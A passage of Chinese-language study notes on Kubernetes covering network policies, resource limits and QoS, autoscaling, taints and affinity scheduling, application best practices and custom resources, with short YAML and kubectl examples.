的网络访问规则，允许或限制入网和出网通信，实现一定程度的网络隔离；默认情况下 Pod 是可以被任意来源的请求进行访问的； 在一个命名空间中启用网络隔离如果想把某个命名空间中的所有 Pod 隔离起来，可以创建一个没有写 ingress 入网规则的 NetworkPolicy，同时标签选择器放空，这样它会匹配命名空间中的所有 pod NetworkPolicy 资源能够生效的前提，是需要集群中的 CNI 插件支持这种资源；不然创建了资源，也不能发挥作用； 允许同一命名空间中的部分 pod 访问一个服务端 pod如果不加限制，同个命名空间中的 pod 之间，是可以自由的相互访问的，为了提高安全性，可以设置让某个 pod 只允许被指定pod 访问，而不能被未指定的 pod 访问；做法就是创建一个 NetworkPolicy，作用于该 pod，然后在入网规则中写上允许访问的 pod 的标签选择器和可访问的端口号，这些就只有标签选择器匹配的那些 pod， 才具有访问权限； 即使 pod 之间是通过 service 相互访问，以上规则仍然会生效；因为 service 的本质仍然是要回到 iptables 去实现的； 在不同命名空间之间进行网络隔离实现方法很简单，在入网规则中，有一个 namespaceSelector 的属性，可以用来写命名空间的选择器； 使用 CIDR 隔离网络前面提到的入网规则是通过标签选择器来实现的，另外还可以通过 IP 段来限制，即只允许某个 IP 段范围内的请求，实现办法是通过 ipBlock.cidr 属性来实现 限制 pod 的对外访问流量通过对出网规则 egress 规则进入设置即可实现 pod 的对外访问 14. 计算资源管理为 pod 中的容器申请资源创建包含资源 requests 的pod 资源 requests 如何影响调度requests 用来指定容器所需要资源的最小值，而不是上限值；但它会影响调度器的调度，但调度器发现某个节点的资源已经不满足 requests 要求的最小值时，就不会将 pod 调度到该节点上； 调度器有两种优先级调度函数，一种是优先调度到最有空闲的节点，另一种是优先调度到最满负荷的节点；前者可以让节点的资源使用平均化；后者则可以尽量少的节点运行尽可能多的 pod； 当节点上的可用资源不足时，pod 将无法正常进入运行状态，而会一直处于 pending 状态，直到有 pod 被删除后资源被释放出来； CPU requests 如何影响 CPU 时间分配CPU requests 不仅会影响调度器的调度工作，还会影响到节点上可用资源在多个 pod 之间的分配工作；调度器会根据申请的资源数量的比例，来分配余下的可用资源给相应的 pod；但如果剩余可用资源刚好没有其他 pod 占用时，调度器会将所有的剩余资源临时全部分配某个繁忙的容器；当其他容器开始要用时，再退还； 定义和申请自定义资源CPU 和内存是常规的可用资源，Kubernetes 还支持一些自定义资源，例如 GPU；在使用这类自定义资源时，需要先将自定义资源加入节点 API 对象的 capacity属性中，以便 Kubernetes 可以知道该资源的存在；之后，就可以像常规资源一样去引用它了； 限制容器的可用资源设置容器可使用资源量的硬限制CPU 是一种可压缩资源，即对进程做出使用限制，并不会影响进程的正常运行，只是会让它的性能下降，计算时间变长而已；而内存是一种不可压缩资源，当为某个进程分配了一块内存后，如果进程没有释放该内存，将导致该块内存一直被占用，即使内存存在空闲，其他进程也没有机会使用；因此，对 pod 的可用资源数量做出最大限制是有必要的，这样可以防止出现恶意 pod 导致整个节点不可用； 当设置了 limits 值后，如果没有设置 requests 值，而默认使用 limits 值做为 requests 值； 调度器不会将 pod 调度到剩余资源不足的节点上，但是会调度到 limits 超过 100% 的节点上，limits 存在超卖现象；limits 并不作为节点调度的控制因素；但是当节点节点上的一个或多个容器使用的资源使用超过 limits 总量时，将导致个别容器被干掉； 超过 limits当某个容器申请超过 limits 限制的内存资源时，如果 pod 的重启策略设置为 Always 或者 OnFailure时，容器将会被干掉（OOMKilled， out of memory killed）；此时 pod 会呈现 CrashLoopBackOff 状态（即不断重启，每次增加一部的间隔时间，最大间隔规定为 5 分钟）； 容器中的应用如何看待 limits 当在容器中运行 top 命令来查看内存使用情况时，显示的结果是节点的内存使用情况，而不是真实的容器中的进程所使用的内存情况；不仅内存有这个情况，CPU 的使用也是这个情况； 因此，如果需要在代码中查询可用资源数量时，应避免使用常规的 linux 命令来查看，而应该通过 downward API 来查看实际配置的 limits 值，然后再采取相应的操作；另外也可以通过 cgroup 系统来获取配置的 CPU 限制（如下面的两个文件）； 12/sys/fs/cgroup/cpu/cpu.cfs_quota_us/sys/fs/cgroup/cpu/cpu.cfs_period_us 了解 pod QoS 等级由于 limits 会被超卖导致某些容器在内存资源不足时被杀死，因此需要制定一个优先级的规则，来决定谁应该优先被杀死； 优先级从低到高分别是： BestEffort：低 Burstable：中 Guaranteed：高 定义 pod 的 QoS 等级QoS 等级来源于容器的 requests 和 limits 字段的配置，并没有一个单独的字段可以进行定义； BestEffort 等级容器没有设置 requests 和 limits 值的 pod 都属于这个等级； 优点：内存资源充足的情况下，可使用的内存无上限； 缺点：没有任何的资源保证；资源不足时，则啥也分不到；需要释放资源时，首批被杀死； Guaranteed 等级所有容器 requests 和 limits 值相等的 pod 属于这个等级； 优点：可保证所请求的资源能够全额分配； 缺点：除了已分配的外，无法使用更多的资源； Burstable 资源不属于前面两个等级的 pod，属于这个级别； 对于多容器的 pod，只有当所有的容器都属于 BestEffort 或者 Guranteed 等级时，pod 才是相应的等级，不然全部归属于 Burstable 等级； 内存不足时哪个进程会被杀死被杀掉的顺序跟 QoS 等级对应，BestEffort 最先被杀掉，最后是 Guaranteed；只有在系统进程需要内存时，Guranteed 进程才可能被杀掉； 对于两个等级相同的 pod，当内存不足时，那个实际使用内存量占申请量更高的 pod 将会被杀掉，即优先杀掉大骗子，留下小骗子； 为命名空间中的 pod 设置默认的 requests 和 limitsLimitRange 资源简介LimitRange 资源有点像是一个模板，当没有显式的为 pod 设置资源使用声明时，默认使用模板提供的值；并且如果 pod 申请的值超过了模板允许的上限，pod 将不会被允许创建，直接出现报错； LimitRange 只作用于单独的 pod，所以它不会对所有 pod 要使用的资源总量起作用； LimitRange 资源的创建 示例的写法将不同类型对象的资源使用限制写在了同一个 LimitRange对象中，但是也可以拆分写在多个对象中，每个控制一种类型； LimitRange 只适用于在其后创建的资源，如果某个资源在 LimitRange 创建之前已经存在，则不会受到限制； 强制进行限制当对可用资源进行了限制后，此时如果创建超过限制的对象，Kubernetes 将直接给出报错信息； 应用资源 requests 和 limits 的默认值LimitRange 的作用域是以命名空间为单位的，即只对当前命名内的对象有效，而对其他命名空间的对象无效； 限制命名空间中的可用资源总量LimitRange 只能限制单个 pod 的资源使用，没有对可使用的资源总量做出限制，因此如果恶意创建大量的 pod，将会导致整个集群的资源全部被占用掉； ResourceQuota 资源介绍ResourceQuota 可以对两个事情做出限制 一个是所有 pod 可以使用的资源总量，当监控限制量此，如果此时新增一个 pod 导致超出限额，则该 pod 不会创建成功； 另一个是可创建的对象数量； 创建 ResouceQuota 对象示例 在创建 ResouceQuota 之前，必须先创建 LimitRange，这样 ResouceQuota 才能创建成功，不然会报错；因为如果没有 LimitRange，则 BestEffort 等级的 pod 可使用的资源是没有上限的； 为持久化存储指定配额 限制可创建对象的个数123456789101112131415apiVersion: v1kind: ResourceQuotametadata: name: objectsspec: hard: pods: 10 replicationcontrollers: 5 secrets: 10 configmaps: 10 persistentvolumeclaims: 4 services: 5 services.loadbalancers: 1 services.nodeports: 2 ss.storageclass.storage.k8s.io/persistentvolumeclaims: 2 为特定的 pod 状态或者 QoS 等级指定配额配额可以指定作用范围，总共有四种作用范围，只有当对象满足作用范围的条件时，配额限制才会生效； BestEffort：BestEffort 类型的对象 NotBestEffort：非 BestEffort 类型的对象 Terminating：Terminating 类型的对象（已进入 Failed 但未真正停止的状态） NotTerminating：非Terminating 类型的对象 BestEffort 只允许限制 pod 的个数，而其他三种还可以限制 CPU 和内存； 监控 pod 的资源使用量资源使用配额如果写得太高，则会导致资源浪费，如果定得太低，则会导致应用经常被杀死，服务不稳定，因此需要找到一个最佳平衡点；平衡点的寻找办法即是通过监控应用的资源使用情况来进行决策； 收集、获取实际资源使用情况在每个节点上，Kubelet 自带有一个插件，可以用来收集节点上的资源消耗情况；而 Kubernetes 则可以通过附加组件 Heapster 来进行统计，得到监控信息； Heapster 已经停用，现在改成了 metrics-server, 本地集群的启用方法 minikube addons enable metrics-server，启用后，需要等待好几分钟才能收集到数据并准备好 显示节点的 CPU 和内存使用量 显示 pod 的 CPU 和内存使用量 如果要查看容器的资源使用情况，则需要加上 –container 选项； 保存并分析历史资源的使用统计信息top 命令只显示当前的资源使用情况，而不是历史的统计；即使是 cAdvisor 和Heapster 也只保留了很短的一段时间内的数据；如果想要获得比较长的一段时间的统计数据，需要引入数据库对数据进行保存和可视化，常用的工具为 InfiuxDB 和 Grafana； InfiuxDB 和 Grafana 都是以 pod 的形式运行的，因此只要下载相应的声明文件，即可快速部署；如果是 Minikube 则更加简单，只需要启用相应的插件就可以了； 找到 grafana 的地址 15. 自动横向伸缩 pod 与集群节点在 pod 开始运行起来之后，如果发现请求量逐渐增加，通过手工更改 deployment、replicaSet 等资源的副本数量，可以实现 pod 数量的增加；但是这需要提前知道流量何时会增加，可是有时候并没有办法提前知道，因此需要引入一套监控的机制，当监控的指标发生变化时，让集群根据提前设置好的规则，自动增加 pod 的副本数量或者是节点数量； pod 横向自动伸缩HPA 插件，horizontalPodAutoscaler，是一个专门用来监控 pod 的运行状态指标的插件，当规则条件满足时，它就会自动调整 pod 的副本数量； 了解自动伸缩过程分为三个步骤来实现 获取状态指标HPA 并不用自己去采集指标数据，因为有其他插件已经做了这个工作（即工作节点上的 cAdvisor 和主节点上的 Heapster），它只需要跟 Heapster 拿数据就可以了； 计算所需 pod 副本数一般根据 CPU 使用率和 QPS 每秒访问数量来计算 调整 replica 属性HPA 并不是直接调用 API 服务器的接口对相关资源（如 Deployment、ReplicaSet等）的副本数进行修改，而是通过联系这些资源的子资源对象来修改；这样做的好处是任何资源如果在实现上有任何变更，HPA 这边不会受到任何影响，不需要做任何的修改，它们之间通过子资源实现了隔离；同时不同的资源之间也不会相互影响，因为它们只要管好自己的子资源就可以了； 整个自动伸缩的过程 基于 CPU 使用率进行自动伸缩在使用 CPU 使用率指标监控 pod 的使用情况时，HPA 插件实际上是根据 pod 定义中提到的 CPU 资源请求来计算的，即根据 pod 运行过程中使用的 CPU 和原请求的 CPU 之间的比例，来判断 pod 是否在超负荷运转； HPA 对象有两种创建方法，一种是通过 YAML 声明文件，一种是通过 kubectl autoscale 命令（表面上看它操作的对象是 deployment，但在操作的过程中，它会自动创建一个 HPA 对象） 当 pod 的 CPU 使用率超过目标值时，HPA 会对其进行扩容；反之变然，即当运行中的 pod 的 CPU 使用率远低于目标值时，HPA 也会做缩容的动作； HPA 在扩容的时候，虽然会根据目标值进行计算，得到达成目标值的最少 pod 数量；但是它并不一定能够一步达到将 pod 调整到该数量，尤其是当这个数量比较大的时候；在单次扩容操作中，如果当前副本数小于等于2，则最多只能扩容到4个副本；如果当前副本数大于2，则最多只能扩容一倍； 另外触发扩容或者缩容也有时间间隔的限制；只有距离上一次扩缩容超过3分钟时，才会触发扩容；超过5分钟时，才会触发缩容； 当需要对 HPA 中设定的目标值进行修改时，有两种操作办法，一种是使用 kubectl edit 命令；另一种是先删除原先的 HPA 资源，然后再重新一个； 基于内存使用进行自动伸缩使用方法跟 CPU 一样，没有区别，此处略； 基于其他自定义度量进行自动伸缩想要使用其他自定义度量进行自动伸缩，需要有一个前提，即度量涉及的指标数据有被收集；度量有有如下类型： resources 度量类型例如 CPU，内存等； pod 度量类型例如 QPS（每秒查询次数） Object 度量类型这种类型极大的扩展了 HPA 的使用场景，它让 HPA 可以根据集群中的其他资源对象的属性来计算是否需要扩缩容 确定哪些度量适合用于自动伸缩如果增加副本数之后，并不能使度量的目标值线性的降低，而很可能让度量指标并不适宜；因为该指标的变化，跟 pod 扩缩容可能并不存在实际上的关系； 缩容到零个副本目前暂时还不允许缩容到零个副本，但据说未来会实现这个功能； pod 的纵向自动伸缩目前 Kubernetes 官方还没有实现这个功能，但是 google GKE 却有这个功能，它会统计 pod 的资源使用情况，然后自动调整 pod 定义信息中的 resource require 和 limit，以最大化的利用硬件资源； 集群节点的横向伸缩当现有的节点不再满足需求，需要添加更多节点时，有一个 ClusterAutoscaler 插件可以用来完成这个任务； 当要添加新节点时，还会遇到该新节点应该是什么样的规格，因此集群需要提前配置好可用的节点规格；这样 ClusterAutoscaler 插件会检索这些可用规格，从中找到一个能够满足 pod 要求的规格，然后创建该节点； 当有多个规格都能够满足 pod 需求时，此时插件就需要从中找一个最合适的； 当插件发现节点上所有 pod 的 CPU 和内存使用率都低于 50% 时，它会开始考虑归还该节点；但是前提上节点上运行的 pod 是否可以被调度到其他节点上，如果可以就归还；如果不可以，就不归还； kubectl cordon 命令会将节点标记为不可调度（即不会再往该节点添加新 pod），但已在节点上运行的 pod 不受影响，仍然正常运行； kubectl drain 命令除了将节点标记为不可调度外，还会将节点上已在运行的 pod 疏散到其他节点上； 启用 Cluster Autoscaler如果启用 Cluster Autoscaler 跟集群部署哪家云供应商有关系，因为不同的云供应商有不同的作法，以下是 GKE 的示例： 1gcloud container clusters update kubia --enable-autoscaling --min-nodes=3 --max-nodes=5 限制集群缩容时对服务的干扰当发生缩容时，节点会被回收，因此运行在 pod 上的节点将变得不可用；但是有可能业务场景对可用的 pod 数量有最低要求，例如 mongo 至少需要有3个实例组成 replica set；因此，为了避免这种状况发生，可以通过创建 podDisruptionBudget 资源来限制集群缩容时对服务带来的干扰 1kubectl create pdb kubia-pdb --selector=app=kubia --min-available=3 podDisruptionBudget 资源的属性很简单，只由标签选择器和最小可用数 min-available 和 max-unavailable 两个属性组成； 16. 高级调度使用污点和容忍度阻 pod 调度到特定节点它的工作原理是给节点添加污点，然后只有那些在定义中规定该种污点可容忍的 pod， 才会被调度到该节点上（有污点相当于默认不分配，让普通 pod 远离该节点）； 想要实现节点和 pod 之间的关系安排，不外乎有两种做法，一种是不主动对节点做标记，而是在 pod 中做标记，定义应使用哪些节点；另一种是反过来，不主动在 pod 中进行定义，而是先对节点做标记，然后只用那些在定义中明确表示可接受节点上的相关标记的 pod，才会被调度到该节点； 介绍污点和容忍度污点和容忍度的做法默认会用在主节点，这样确保只有标记了可容忍该污点的那些系统级 pod，才会被安排在主节点上； 此处 effect 字段的值是 NoSchedule，它表示不能容忍这种污点的 pod 不要调度到当前节点来 污点的效果： NoSchedule：表示如果不能容忍，则不调度 pod 到节点上； PreferedNoSchedue：表示如果不能容忍，则尽量不调度到该节点上，除非没有其他节点可以调度； NoExecute：前两个 schedule 只会在创建 pod 时影响 pod 的调度；execute 则会在 pod 运行过程中影响调度；当某个节点在 pod 运行期间突然改变状态，导致 pod 不能容忍时，就会重新调度该 pod 到其他节点； 在节点上添加自定义污点给节点 node1.k8s 添加自定义污点 node-type&#x3D;production，这样如果不属于生产环境的 pod，就不调度到该节点上，即该节点属于生产环境 pod 的专用； 1kubectl taint node node1.k8s node-type=production:NoSchedule 虽然这种做法可以保证非生产环境 pod 不会被调度到该节点上，但却无法保证生产 pod 被调度到非生产环境的节点上；为了让生产环境和非生产环境的 pod 隔离开，还需要额外给非生产环境的节点添加污点； 在 pod 上添加污点容忍度 污点操作符除了 Equal 外，还有 Exist； 污点容忍度的时间限制在某些情况下，节点可能会失效，此时集群管理组件会给节点添加污点 unready 或 unreachable，那么如果 pod 对这两种污点没有容忍度的话，就会被调度到其他节点上；但是有时节点在一定的时间后，会恢复正常，此时 pod 并不需要被重新调度，只需要等待一段时间即可；至于想要等待多久，可以通过在 pod 容忍度的设置中，添加容忍时间； 使用节点亲缘性将 pod 调度到特定节点上关于如何调度 pod 到指定节点，早期 Kubernetes 的实现是使用 nodeSelector 的机制；但后来发现它并不能满足所有类型的业务需求，因此在新的版本中引入了亲缘性规则，后续预计将逐步替代旧的 nodeSelector 机制； 问：节点亲缘性貌似并不是强制的，而是一种倾向偏好性，即当所有节点都无法满足 pod 的亲缘性需求时，调度组件就会将 pod 调度到任意节点上？ 答：后来发现它的规则要复杂得多，虽然默认状态下是非强制性的，但也可以通过规则定义成强制性的； 使用节点亲缘性的前提是节点需要设置有一些标签，这样 pod 才能根据这些标签判断节点是否有亲缘性；如果没有标签，那就没有办法了； 在 GKE 上面创建集群时，需要设置集群的名称，同时选择地理区域和该区域内部的可用分区，现在才发现，原来 GKE 是通过给节点添加亲缘性标签来实现的；而实质上所有的节点都是在一个大集群内，我们创建的小集群只是逻辑上的； 指定强制性亲缘性规则强制指定 pod 只能被分配到配备有 GPU 的节点上 1234567891011121314apiVersion: v1kind: Podmetadata: name: kubia-gpuspec: affinity: nodeAffinity: requiredDuringSchedulingIgnoreDuringExecution: nodeSelectorTerms: - matchExpressions: - key: gpu operator: In values: - &quot;true&quot; requiredDuringSchedulingIgnoreDuringExecution 表示本规则只适用于新创建的 pod， 不影响已经在运行中的 pod； 调度 pod 时优先考虑某些节点前面提到亲缘性的规则要生效，节点本身必须被提前打上标签；有趣的是，还可以在这些标签中指定节点是独占的还是共享的；不同的标签还可以设置权重系数，用来计算优先级； 1234567891011121314151617181920212223242526apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: prefspec: template: ... spec: affinity: nodeAffinity: # 此处使用了 preferred，而不是 required，表示是非强制性的，只是优先考虑 preferredDuringSchedulingIgnoreDuringExecution: - weight: 80 preference: matchExpressions: - key: availability-zone operator: In values: - zone1 - weight: 20 preference: matchExpressions: - key: share-type operator: In values: - dedicated 使用 pod 亲缘性与非亲缘性对 pod 进行协同部署亲缘性的规则除了可以用来指定 pod 应该部署到哪些节点上，还可以用来设置哪些 pod 应该尽量被部署在相近的位置，就像亲人住在一起一样； 前者通过 nodeAffinity 字段来实现，后者通过 podAffinity 字段来实现； 使用 pod 间亲缘性将多个 pod 部署在同一个节点上 此处使用了 labelSelector.matchLabels 字段来设置标签选择器，另外还可以使用表达能力更强的 matchExpressions 字段； 假设 A pod 要追随 B pod 的部署位置，那么只需在 A pod 上面定义亲缘性规则即可，并不需要在 B pod 上面定义；但是，当 B pod 因为某些原因被删除而重新创建时，调度器仍然会根据 A pod 的规则，将 B pod 部署在 A pod 所处的节点上（这样做才能维护 A pod 亲缘性规则的一致性，不然如果 B pod 部署到节点上，规则就被违反了） 实现原理：当存在多个可用节点时，调度器本质上是通过给不同节点的优先级打分以选择最合适的节点； 将 pod 部署在同一机柜、可用性区域或者地理地域将所有的亲缘 pod 都部署在同一节点并不一定是最好的选择，因为当节点发生故障时，会导致服务不可用；从健壮性的角度，部署在相同地理区域的不同节点上，也是一种好的方案；此点可以通过 topologyKey 字段来实现；它可以有多种值，表示不同的规则 failure-domain.beta.kubernetes.io&#x2F;zone 指定将 pod 部署在相同的可用区中； failure-domain.beta.kubernetes.io&#x2F;region 指定将 pod 部署在相同的地理区域中； topologyKey 字段有好几个值，看上去好像很复杂很神奇的样子，但其实它的实现原理特别简单，就是在节点上添加标签键值对，然后在 pod 定义中的 topologyKey 添加相应的键名，这样调度器会优先选择匹配的节点来部署相应的 pod，其作用很像是标签选择器； 表达 pod 亲缘性优先级取代强制性要求使用 required 类型的亲缘性规则意味着调度是强制性的，但如果不需要强制，只是优先考虑，则可以使用 prefered 开头的规则，并为之写上权重系数即可； 利用 pod 的非亲缘性分开调度 pod有时候我们想将一些 pod 部署在一起，有时候则相反，想让某些 pod 具有互斥性，即不要安排在一起，这时可以使用非亲缘性（感觉用互斥性更直观）规则来实现这个效果，即 nodeAntiAffinity 或者 podAntiAffinity 字段； 使用强制的互斥性规则来部署 pod 时，如果节点的数量不够，将使用一部分 pod 处于 pending 状态，无法调度成功；如果对互斥程度要求没有那么高，则可以考虑使用 prefered 规则来实现； 17. 开发应用的最佳实践集中一切资源在 Kubernetes 中，所有的一切都是资源，但是它们有些是由开发人员创建并维护的，有些则是由集群人员创建和维护；二者有所分工，互不耦合； Pod 通常会用到两种类型的 secret 数据，一种是用来拉取镜像用的，一种是在 Pod 中运行的进程所用的；secret 一般并不作为声明文件的组成部分，而应该是由运维人员进行配置，并分配给 serviceAccount，然后 serviceAccount 再分配给各个 pod； 初始化环境变量一般使用 configMap 卷；这样对于开发人员来说，引用的卷是固定的，但是卷的内容是可以根据环境变化的； 集群管理员会创建一些 LimitRange 或 ResourceQuota 对象，由开发人员在声明文件中引用；这些对象可以控制 pod 可以使用的硬件资源； 了解 pod 的生命周期将应用交给 Kubernetes 来运行的注意事项： Pod 中的应用随时可能被杀死，并由新 Pod 来替代； 写入磁盘的数据可能会消失； 使用存储卷来跨容器持久化数据； 如果 Pod 是正常的，但 Pod 内的容器持续崩溃，Pod 并不会被销毁重建； Pod 的启动是没有顺序的； 可以在 Pod 中创建 init 容器来控制主容器的启动顺序； Pod 中的容器支持启动前 post-start 和启动后 pre-stop 的钩子； 问：貌似可以通过启动后钩子来控制容器的启动顺序？ 答：后来发现更好的做法是让容器自己能够应对无顺序的情况，即在其他容器没有就绪前不会出错，而是会进行一定时间的等待； 以固定的顺序启动 pod通过在 pod 中创建 init 类型的容器，在它里面写一段脚本来监测其他容器或服务是否已经就绪，如果就绪，就开始启动主容器；init 容器写在声明文件的 spec 属性下面，如下图所示； 虽然有机制来控制应用的启动顺序，但更好的实践作法是放应用本身可以应对其所依赖的服务未准备好时的情况；例如对于应用所连接的数据库服务，当连接不上时，就先暂停，然后每隔一段时间后进行重试； 问：应用有可能在中途出现断开依赖服务的情况，不知此时是否可以通过 readiness 探针来告知 Kubernetes 当前应用进入了未准备好的状态？如果 readiness 探针是一次性的话，那或许这个工作可以交给 liveness 探针来完成； 答：后果发现 readiness 的探针不是一次性的，它会在容器运行过程中仍然保持工作； 增加生命周期钩子启动后钩子执行成功，容器才会启动，不然会呈现等待的状态，但它和容器中的主进程是同时开始执行的； 钩子的输出信息如果是输出到标准输出的，将会导致查看不到，这样会不方便高度，因此，如果可以的话，最好还是输出信息到日志文件中更好； 停止前钩子没有成功也不影响容器被终止； 了解 pod 的关闭kubelet 关闭 pod 时涉及如下顺序的动作： 执行容器停止前钩子（如有）； 向容器的主进程发送 SIGTERM 信号（因为容器本质上只是操作系统中的一个进程，所以关闭容器跟关闭进程本质上是一样的）； 给容器一定的时间（宽限期），让其优雅的关闭； 如果容器动作超时，则使用 SIGKILL 信号进行强制关闭； 终止宽限期的时间是可以配置的，默认是 30 秒； 由于 kubelet 是将关闭信号发给容器，而不是发给容器中的应用，因此应用有可能并没有收到这个信号；此时应用可以通过停止前钩子来让自己得到通知； 此处存在一个悖论，即 pod 是运行在节点上的，因此不管在 pod 中设计了何种优雅的关闭机制，它都无法保证和控制它所在的节点突然出现的崩溃；此时会导致它的任何优雅关闭流程被强行终止；针对这个悖论的解决办法是另辟蹊径，即通过长期或定期运行一个 job，检查有没有出现一些孤立的资源（说明其所有节点可能已经崩溃了），如果有的话，就把它们安置到妥善的地方去； 确保所有的客户端请求都得到了妥善处理在 pod 启动时避免客户端连接断开解决方案：在 pod 声明文件中添加一个就绪指针，探测 pod 就绪成功后，再对外提供服务； 在 pod 关闭时避免客户端连接断开API 服务器在收到停止并删除某个 pod 的请求后，会同时做两件事情，一件是通知 endpoint 管理器更新转发规则，一件是通知 kubelet 删除 pod；前一个动作需要较长的执行时间（因为需要多个 endpoint 的 iptables 转发规则），后一个动作所需要的执行时间比较短，因此，后者大概率会以更快的速度完成；这会产生一个问题，即 pod 已经停止工作了，但是可能仍有请求被转发了进来，导致这些请求无法被正确处理； 以上问题并没有百分百的解决办法，唯一的办法是延长 pod 关闭时的等待时间，多几秒钟即可，例如 5-10 秒；这可以通过添加一个停止前的钩子，让容器睡眠一段时间来解决； 让应用在 Kubernetes 中方便运行和管理构建可管理的容器镜像冲突点：生产环境使用的镜像应该尽可能的小，这样可以缩短节点上镜像的下载时间，让 pod 更快的进入准备就绪的状态；而开发环境使用的镜像应该大一些，尽量包括一些方便在开发过程中进行调试的工具，例如 ping、curl、dig 等； 合理地给镜像打标签避免使用 latest 作为标签，因为无法通过这个标签知道当前 pod 运行的是那个版本的镜像，表面上它们的标签都一样，但实际上有一些可能是使用新镜像，一些使用的是旧镜像； 资源使用多维度而不是单维度的标签资源常见的标签维度： 资源所属的应用名称； 应用层级，例如前端、后端等； 运行环境，例如开发、测试、生产等； 版本号； 发布类型，例如稳定版、beta 版等； 分片，如果存在分片的话； 租户，如果存在租户的话（貌似还可以使用命名空间）； 通过注解描述每个资源注解可以给资源增加一些额外的信息，方便其他人更好的管理；一般有两个常用的注解，一个是关于资源负责人信息，一个是关于资源的描述； 其他类型的注解： pod 所依赖的服务：用来展示 pod 之间的依赖关系； 构建和版本信息； 第三方工具或图形界面可能要用到的元信息； 给进程终止提供更多的信息当容器挂掉后，需要调查挂掉的原因；为了让这个事情更便利，Kubernetes 提供了一个终止专用的日志文件 &#x2F;etc&#x2F;termination-log；当进程发生失败时，可以将消息写入这个文件，这样在调查原因时，可以通过 describe 查看到这个日志文件里面的内容； 我们并不知道容器中的应用何时会因意外终止退出，因此貌似可以通过捕捉错误，并将错误写入集中式的日志，以便后续进行错误的定位和排查； 处理应用日志在开发环境中，容器中的应用正常应将日志输出到标准输出，这样可以使用 logs 命令方便的进行查看；但如果是写到文件中，则需要使用 exec cat 命令进行查看； 在生产环境中，则使用一个集中式的日志管理器（不然崩溃的 pod 被删除后，pod 上面的日志也会跟着消失），它一般会部署在某个 pod 上，统一接收所有的日志消息；一个常见的解决方案是使用 EFK 栈，它们是三个工具，一个负责收集（FluentID）、一个存储（ElasticSearch)、一个展示（Kibana)； 开发和测试的最佳实践开发过程中在 Kubernetes 之外运行应用Kubernetes 要求将应用打包成镜像之后才能执行它，但这样显然不利于提高开发效率；如果应用的运行需要用到 Kubernetes 的某些功能，则可以模拟出来；API 服务器对于集群内和集群外的请求都是透明的，对它们一视同仁； 貌似唯一需要模拟的是 configMap 和 secret，其他的部分好像跟运行 docker-compose 没有特别大的差别； 在开发过程中使用 Minikube可以使用 Minikube 来模拟集群，同时通过 minikube mount 的功能，将本地文件夹挂载到 minikube 虚拟机中，然后再通过 hostPath 载挂载到容器中，这样就可以让本地文件的更改，实时的传递到容器中了； 在 shell 中设置 DOCKER_HOST 变量，让 dockers daemon 指向 minikube 虚拟机中的 docker daemon 后，则可以通过本地的 docker 命令来实现对虚拟内的 docker操作 将本地的镜像推送到 minikube 虚拟机中 发布版本和自动部署资源清单声明文件可以使用版本系统进行单独管理，每次提交更改后，就可以使用 apply 命令来更新当前的资源了； 甚至连手工的 apply 动作也可以进行自动后，可以采用第三方工具例如 kube-applier，它的作用有点像 github 的 webhook，当检测到有新提交的声明文件版本后，就会自动更新资源； 使用 Ksonnet 作为编写 YAML&#x2F;JSON 声明文件的额外选择Ksonnet 可以将声明文件模块化（使用 JSON 格式），然后通过组合共用的模块来减少编写重复的代码； 编写完成后，调用命令行进行转换 利用持续集成和持续交付可以参考 Fabric8 项目 http://fabric8.io 18. Kubernetes 应用扩展定义自定义对象自定义对象可以让集群的使用者站在更宏观的角度来使用集群，由更抽象的高级对象来实现业务需求，而不再直接与 Deployment、Secret、Service、Pod 等基础对象打交道；整个集群的管理和使用变得更加傻瓜化了； CustomResourceDefinitions 介绍简称 CRD，自定义资源应该至少由两部分构成，一个是该自定义资源对象的定义，另一个是资源的管理组件，这样当用户创建某个资源实例时，集群才能够调用该资源的管理组件，去做余下的工作（创建各种基础资源对象）； 定义好了后，就可以通过声明文件或者命令创建该种类型的资源了； 截止到这里，由于还没有创建控制器，因此实际上这些对象暂时还起不到任何实际的业务作用； 使用自定义控制器自动定制资源控制器应该至少做两个动作，一个是监控 API 服务器发出的事件通知，另一个是向 API 服务器提交请求，创建相应的资源； 当控制器启动后，它实际上并不是直接向 API 服务器发请求，而是通过当前 pod 中的 sidecar 容器 kubectl-proxy 来发送请求的，sidecar 充当了一个代理的作用； 控制器的本质其实很简单，它其实就是持续监听相关资源的事件，然后将原来手工操作的动作，转换成代码来实现；这些动作包括创建资源、删除资源、更新资源、查看资源等； 由于控制器本质上就是一个帮忙自动化干活的 pod，因此在部署到生产环境时，一般可以将它部署为 Deployment 资源，这样如果出现故障，可以自动恢复； 当实现了控制器的这些自动化的操作后，意味着可以将它们封装起来，对外隐藏复杂性，对于最终用户来说，他只要提供一个源代码的仓库链接，就可以快速的将网站部署起来，完全不需要了解关于 kubernetes 的任何知识；这样就可以构建 PaaS 服务了； 验证自定义对象如果让用户直接提交 YAML 文件来创建自定义的资源对象，会存在一个问题，即用户可能会提交无效的字段；因此集群在收到用户的资源创建请求时，有必要对其进行验证，确保 YAML 合法有效时，才进行创建；由于此时创建事件还没有发生，因此控制器无法完成验证的工作；因此需要由 API 服务器来完成（通过启用 CustomResourceValidation 特性来实现，在 1.8 以上版本中才有） 为自定义对象提供自定义 API 服务器除了使用 CustomResourceValidation 来验证请求的合法性外，还有另外一种更激进的办法，即自定义一个 API 服务器；当有了这个自定义的 API 服务器后，甚至连原本的 CRD 对象都不需要了，可以直接写到自定义的 API 服务器中；此时多个 API 服务器形成了一种聚合，对客户端来说是无感知的，客户端的请求将被分发到不同的 API 服务器进行处理； 原来以为多 API 服务器的实现将是一个很复杂的功能，后果发现原来 Kubernetes 有内置了一个 APIService 的资源（本质上就是将该某些自定义资源对象的请求转发到提供该 APIService 的 pod，并不复杂，转发规则为 API 组名+版本号），只要创建该类型的资源，就可以实现多个 API 服务器；主 API 服务器会根据请求的属性，将其转发到这些多出来的 API，由它们做进一步的处理（但是仍然不可避免需要提供此 APIService 的 pod 写上一段自动化的代码，即将原来 CRD 控制器的代码移到这里来了）； 除了可以自定义 API 服务器，还可以实现自定义 CLI 客户端，实现 Kubectl 不方便完成的更多自定义功能； 使用 Kubernetes 服务目录扩展 Kubernetes服务目录是指列出所有可用服务的目录，然后用户根据需要选择对应的服务即可，而不需要自己去创建各种基础资源（如 Deployment、Service 等），简化用户对 Kubernetes 的使用门槛； 服务目录介绍服务目录听上去很像是另外一种资源的抽象和封装，用户可以调用查看当前可用的服务目录，然后选择并创建某个服务；之后该服务会自动去创建各种基础资源，如 Deployment、Pod 等； 后来发现，它最大的作用并止于此，而是 Kuberbetes 